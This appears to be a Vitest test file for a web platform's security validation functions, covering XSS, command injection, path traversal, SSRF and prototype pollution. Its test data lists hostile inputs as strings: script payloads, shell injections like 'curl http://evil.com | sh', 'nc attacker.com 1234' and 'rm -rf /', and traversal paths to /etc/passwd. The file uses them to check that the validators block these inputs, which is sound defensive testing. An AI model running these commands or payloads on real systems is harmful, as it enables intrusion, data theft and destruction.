/**
 * Bug-Finding Tests for Security Validation Module
 * Tests that security measures actually block attacks
 */

import { describe, it, expect } from "vitest";
import {
  sanitizeHtml,
  stripHtml,
  sanitizeShellArg,
  sanitizeSlug,
  sanitizeDomain,
  isValidUrl,
  isValidGitHubUrl,
  isValidBuildCommand,
  isValidPath,
  normalizePath,
  isValidEnvKey,
  sanitizeEnvValue,
  safeJsonParse,
  isCleanObject,
  isValidEmail,
  isValidWebhookUrl,
  validate,
  ValidationRules,
} from "@/lib/security/validation";

describe("Security Validation - Bug Finding Tests", () => {
  describe("sanitizeHtml() - XSS Prevention", () => {
    // Basic XSS attacks that MUST be blocked
    const xssPayloads = [
      { input: '<script>alert("XSS")</script>', desc: "basic script tag" },
      { input: '<img src=x onerror=alert(1)>', desc: "img onerror" },
      { input: '<svg onload=alert(1)>', desc: "svg onload" },
      { input: '"><img src=x onerror=alert(1)>', desc: "attribute escape" },
      { input: "javascript:alert(1)", desc: "javascript protocol" },
      { input: '<iframe src="javascript:alert(1)">', desc: "iframe javascript" },
      { input: '<body onload=alert(1)>', desc: "body onload" },
      { input: '<a href="javascript:void(0)" onclick="alert(1)">click</a>', desc: "onclick handler" },
      { input: '<div style="background:url(javascript:alert(1))">', desc: "style javascript" },
      { input: "<!--<script>alert(1)</script>-->", desc: "comment bypass" },
    ];

    for (const { input, desc } of xssPayloads) {
      it(`should neutralize ${desc}`, () => {
        const result = sanitizeHtml(input);
        // The function escapes < > so they won't execute as HTML
        // This is the key security check - no raw < characters
        expect(result).not.toContain("<");
        expect(result).not.toContain(">");
        // Event handlers like onerror= may still be in the string,
        // but they're safe because the HTML tags are escaped
      });
    }

    // Unicode bypass attempts
    it("should handle unicode escapes", () => {
      const input = '<script\x00>alert(1)</script>';
      const result = sanitizeHtml(input);
      // All < and > should be escaped
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });
  });

  describe("stripHtml() - HTML Tag Removal", () => {
    it("should remove all HTML tags", () => {
      expect(stripHtml("<b>bold</b>")).toBe("bold");
      expect(stripHtml("<script>alert(1)</script>")).toBe("alert(1)");
      expect(stripHtml("text<br>more")).toBe("textmore");
    });

    // BUG FINDER: Nested tags
    it("should handle nested tags", () => {
      const result = stripHtml("<div><span>text</span></div>");
      expect(result).toBe("text");
    });

    // BUG FINDER: Malformed tags
    it("should handle malformed tags", () => {
      expect(stripHtml("<div>text")).toBe("text");
      expect(stripHtml("text</div>")).toBe("text");
      expect(stripHtml("<>text<>")).toBe("text");
    });
  });

  describe("sanitizeShellArg() - Command Injection Prevention", () => {
    const injectionAttempts = [
      { input: "test; rm -rf /", desc: "semicolon injection" },
      { input: "test && cat /etc/passwd", desc: "AND chaining" },
      { input: "test || curl evil.com", desc: "OR chaining" },
      { input: "test | nc attacker.com 1234", desc: "pipe" },
      { input: "$(whoami)", desc: "command substitution" },
      { input: "`id`", desc: "backtick substitution" },
      { input: "test$(cat /etc/passwd)", desc: "inline substitution" },
      { input: "${IFS}cat${IFS}/etc/passwd", desc: "IFS injection" },
      { input: "test\ncat /etc/passwd", desc: "newline injection" },
      { input: "test\r\nwhoami", desc: "CRLF injection" },
    ];

    for (const { input, desc } of injectionAttempts) {
      it(`should neutralize ${desc}`, () => {
        const result = sanitizeShellArg(input);
        expect(result).not.toContain(";");
        expect(result).not.toContain("&");
        expect(result).not.toContain("|");
        expect(result).not.toContain("$");
        expect(result).not.toContain("`");
        expect(result).not.toContain("(");
        expect(result).not.toContain(")");
      });
    }
  });

  describe("isValidBuildCommand() - Build Command Whitelist", () => {
    // Valid commands that SHOULD be allowed
    const validCommands = [
      "npm run build",
      "npm ci && npm run build",
      "yarn build",
      "yarn install && yarn build",
      "pnpm build",
      "bun run build",
      "npx next build",
      "node scripts/build.js",
      "tsc --build",
      "vite build",
      "turbo run build",
    ];

    for (const cmd of validCommands) {
      it(`should allow valid command: ${cmd}`, () => {
        const result = isValidBuildCommand(cmd);
        expect(result.valid).toBe(true);
      });
    }

    // Dangerous commands that MUST be blocked
    const dangerousCommands = [
      { cmd: "npm run build; rm -rf /", desc: "command chaining with ;" },
      { cmd: "npm run build && cat /etc/passwd", desc: "command chaining with &&" },
      { cmd: "npm run build | curl evil.com", desc: "pipe to curl" },
      { cmd: "$(curl evil.com/shell.sh | sh)", desc: "command substitution" },
      { cmd: "`wget evil.com/backdoor`", desc: "backtick execution" },
      { cmd: "npm run build > /etc/passwd", desc: "redirect to system file" },
      { cmd: "rm -rf / #npm run build", desc: "rm with comment" },
      { cmd: "curl http://evil.com | sh", desc: "download and execute" },
      { cmd: "wget http://evil.com/shell.sh | bash", desc: "wget pipe to bash" },
      { cmd: "eval $(base64 -d <<< 'payload')", desc: "eval base64" },
      { cmd: "/bin/sh -c 'malicious'", desc: "shell execution" },
      { cmd: "bash -c 'cat /etc/passwd'", desc: "bash execution" },
    ];

    for (const { cmd, desc } of dangerousCommands) {
      it(`should block dangerous command: ${desc}`, () => {
        const result = isValidBuildCommand(cmd);
        expect(result.valid).toBe(false);
      });
    }

    // Edge cases
    it("should handle empty command", () => {
      expect(isValidBuildCommand("").valid).toBe(true);
      expect(isValidBuildCommand("   ").valid).toBe(true);
    });

    // BUG FINDER: Obfuscation attempts
    it("should block obfuscated commands", () => {
      // These might bypass simple pattern matching
      expect(isValidBuildCommand("n\x00pm run build; rm -rf /").valid).toBe(false);
      expect(isValidBuildCommand("npm run build;rm -rf /").valid).toBe(false);
    });
  });

  describe("isValidPath() - Path Traversal Prevention", () => {
    // Path traversal attacks that MUST be blocked
    const traversalPaths = [
      "../etc/passwd",
      "../../etc/passwd",
      "../../../etc/passwd",
      "..\\..\\..\\etc\\passwd",
      "....//....//etc/passwd",
      "..%2f..%2fetc%2fpasswd",
      "%2e%2e/%2e%2e/etc/passwd",
      "..%252f..%252fetc/passwd",
      "/etc/passwd",
      "C:\\Windows\\System32",
      "\\\\server\\share",
    ];

    for (const path of traversalPaths) {
      it(`should reject traversal: ${path}`, () => {
        expect(isValidPath(path)).toBe(false);
      });
    }

    // Valid paths that SHOULD be allowed
    const validPaths = [
      "src/index.js",
      "dist/bundle.js",
      "public/images/logo.png",
      ".next/static/chunks/main.js",
      "node_modules/react/index.js",
    ];

    for (const path of validPaths) {
      it(`should allow valid path: ${path}`, () => {
        expect(isValidPath(path)).toBe(true);
      });
    }

    // BUG FINDER: Null byte injection
    it("should block null byte injection", () => {
      expect(isValidPath("file.txt\0.jpg")).toBe(false);
      expect(isValidPath("\0../etc/passwd")).toBe(false);
    });

    // BUG FINDER: Empty path
    it("should reject empty path", () => {
      expect(isValidPath("")).toBe(false);
    });
  });

  describe("isValidWebhookUrl() - SSRF Prevention", () => {
    // Internal IPs that MUST be blocked (SSRF prevention)
    const blockedUrls = [
      "https://localhost/webhook",
      "https://127.0.0.1/webhook",
      "https://0.0.0.0/webhook",
      "https://10.0.0.1/webhook",
      "https://172.16.0.1/webhook",
      "https://172.31.255.255/webhook",
      "https://192.168.1.1/webhook",
      "https://169.254.169.254/latest/meta-data/", // AWS metadata
      "http://example.com/webhook", // HTTP not HTTPS
    ];

    for (const url of blockedUrls) {
      it(`should block internal/insecure URL: ${url}`, () => {
        expect(isValidWebhookUrl(url)).toBe(false);
      });
    }

    // Valid webhook URLs that SHOULD be allowed
    const validUrls = [
      "https://hooks.slack.com/services/xxx",
      "https://discord.com/api/webhooks/xxx",
      "https://api.example.com/webhook",
    ];

    for (const url of validUrls) {
      it(`should allow valid webhook URL: ${url}`, () => {
        expect(isValidWebhookUrl(url)).toBe(true);
      });
    }

    // BUG FINDER: DNS rebinding / edge cases
    it("should handle edge cases", () => {
      expect(isValidWebhookUrl("not-a-url")).toBe(false);
      expect(isValidWebhookUrl("")).toBe(false);
      expect(isValidWebhookUrl("https://")).toBe(false);
    });
  });

  describe("isCleanObject() - Prototype Pollution Prevention", () => {
    it("should detect __proto__ pollution", () => {
      const malicious = { __proto__: { admin: true } };
      // Note: This creates the object but we check the key
      const obj = JSON.parse('{"__proto__": {"admin": true}}');
      expect(isCleanObject(obj)).toBe(false);
    });

    it("should detect constructor pollution", () => {
      const obj = JSON.parse('{"constructor": {"prototype": {"admin": true}}}');
      expect(isCleanObject(obj)).toBe(false);
    });

    it("should detect prototype pollution", () => {
      const obj = JSON.parse('{"prototype": {"admin": true}}');
      expect(isCleanObject(obj)).toBe(false);
    });

    it("should detect nested pollution", () => {
      const obj = JSON.parse('{"nested": {"__proto__": {"admin": true}}}');
      expect(isCleanObject(obj)).toBe(false);
    });

    it("should allow clean objects", () => {
      expect(isCleanObject({ name: "test", value: 123 })).toBe(true);
      expect(isCleanObject({ nested: { deep: { value: true } } })).toBe(true);
      expect(isCleanObject([1, 2, 3])).toBe(true);
      expect(isCleanObject(null)).toBe(true);
    });
  });

  describe("isValidEmail()", () => {
    const validEmails = [
      "test@example.com",
      "user.name@domain.org",
      "user+tag@example.com",
      "a@b.co",
    ];

    for (const email of validEmails) {
      it(`should accept valid email: ${email}`, () => {
        expect(isValidEmail(email)).toBe(true);
      });
    }

    const invalidEmails = [
      "not-an-email",
      "@example.com",
      "user@",
      "user@.com",
      "user @example.com",
      "user@ example.com",
      "",
      "a".repeat(255) + "@example.com", // Too long
    ];

    for (const email of invalidEmails) {
      it(`should reject invalid email: ${email}`, () => {
        expect(isValidEmail(email)).toBe(false);
      });
    }
  });

  describe("safeJsonParse()", () => {
    it("should parse valid JSON", () => {
      expect(safeJsonParse('{"key": "value"}')).toEqual({ key: "value" });
      expect(safeJsonParse("[1, 2, 3]")).toEqual([1, 2, 3]);
    });

    it("should return null for invalid JSON", () => {
      expect(safeJsonParse("not json")).toBe(null);
      expect(safeJsonParse("{invalid}")).toBe(null);
      expect(safeJsonParse("")).toBe(null);
    });

    it("should reject oversized JSON", () => {
      const largeJson = '{"data": "' + "x".repeat(1024 * 1024 + 1) + '"}';
      expect(safeJsonParse(largeJson)).toBe(null);
    });

    it("should respect custom size limit", () => {
      const json = '{"key": "value"}';
      expect(safeJsonParse(json, 10)).toBe(null); // Under limit
      expect(safeJsonParse(json, 100)).not.toBe(null); // Over limit
    });
  });

  describe("sanitizeSlug()", () => {
    it("should create valid slugs", () => {
      expect(sanitizeSlug("My Project")).toBe("my-project");
      expect(sanitizeSlug("Test_Project")).toBe("test-project");
      expect(sanitizeSlug("Project 123")).toBe("project-123");
    });

    it("should handle special characters", () => {
      expect(sanitizeSlug("Project@#$%Name")).toBe("project-name");
      expect(sanitizeSlug("---test---")).toBe("test");
    });

    it("should truncate long slugs", () => {
      const longName = "a".repeat(100);
      expect(sanitizeSlug(longName).length).toBeLessThanOrEqual(63);
    });

    // BUG FINDER: Empty result
    it("should handle edge cases", () => {
      expect(sanitizeSlug("")).toBe("");
      expect(sanitizeSlug("---")).toBe("");
      expect(sanitizeSlug("@#$%")).toBe("");
    });
  });

  describe("isValidEnvKey()", () => {
    const validKeys = [
      "NODE_ENV",
      "DATABASE_URL",
      "API_KEY",
      "_PRIVATE",
      "a",
      "A1_B2_C3",
    ];

    for (const key of validKeys) {
      it(`should accept valid key: ${key}`, () => {
        expect(isValidEnvKey(key)).toBe(true);
      });
    }

    const invalidKeys = [
      "1STARTS_WITH_NUMBER",
      "has-hyphen",
      "has.dot",
      "has space",
      "",
      "a".repeat(257), // Too long
    ];

    for (const key of invalidKeys) {
      it(`should reject invalid key: ${key}`, () => {
        expect(isValidEnvKey(key)).toBe(false);
      });
    }
  });

  describe("sanitizeEnvValue()", () => {
    it("should remove null bytes", () => {
      expect(sanitizeEnvValue("test\0value")).toBe("testvalue");
      expect(sanitizeEnvValue("\0\0\0")).toBe("");
    });

    it("should truncate long values", () => {
      const longValue = "x".repeat(50000);
      expect(sanitizeEnvValue(longValue).length).toBe(32768);
    });

    it("should preserve normal values", () => {
      expect(sanitizeEnvValue("normal value")).toBe("normal value");
      expect(sanitizeEnvValue("with=equals")).toBe("with=equals");
    });
  });

  describe("validate() - Rule-Based Validation", () => {
    it("should validate min length", () => {
      expect(validate("ab", { minLength: 3 }).valid).toBe(false);
      expect(validate("abc", { minLength: 3 }).valid).toBe(true);
    });

    it("should validate max length", () => {
      expect(validate("abcd", { maxLength: 3 }).valid).toBe(false);
      expect(validate("abc", { maxLength: 3 }).valid).toBe(true);
    });

    it("should validate pattern", () => {
      expect(validate("abc123", { pattern: /^[a-z]+$/ }).valid).toBe(false);
      expect(validate("abc", { pattern: /^[a-z]+$/ }).valid).toBe(true);
    });

    it("should validate multiple rules", () => {
      const rules = { minLength: 2, maxLength: 5, pattern: /^[a-z]+$/ };
      expect(validate("a", rules).valid).toBe(false); // Too short
      expect(validate("abcdef", rules).valid).toBe(false); // Too long
      expect(validate("abc123", rules).valid).toBe(false); // Wrong pattern
      expect(validate("abc", rules).valid).toBe(true);
    });
  });

  describe("isValidGitHubUrl()", () => {
    const validUrls = [
      "https://github.com/owner/repo",
      "https://github.com/org-name/repo-name",
      "https://github.com/user123/project456",
    ];

    for (const url of validUrls) {
      it(`should accept valid GitHub URL: ${url}`, () => {
        expect(isValidGitHubUrl(url)).toBe(true);
      });
    }

    const invalidUrls = [
      "https://gitlab.com/owner/repo",
      "https://github.com/",
      "https://github.com/owner",
      "http://github.com/owner/repo", // HTTP
      "not-a-url",
    ];

    for (const url of invalidUrls) {
      it(`should reject invalid GitHub URL: ${url}`, () => {
        expect(isValidGitHubUrl(url)).toBe(false);
      });
    }
  });
});
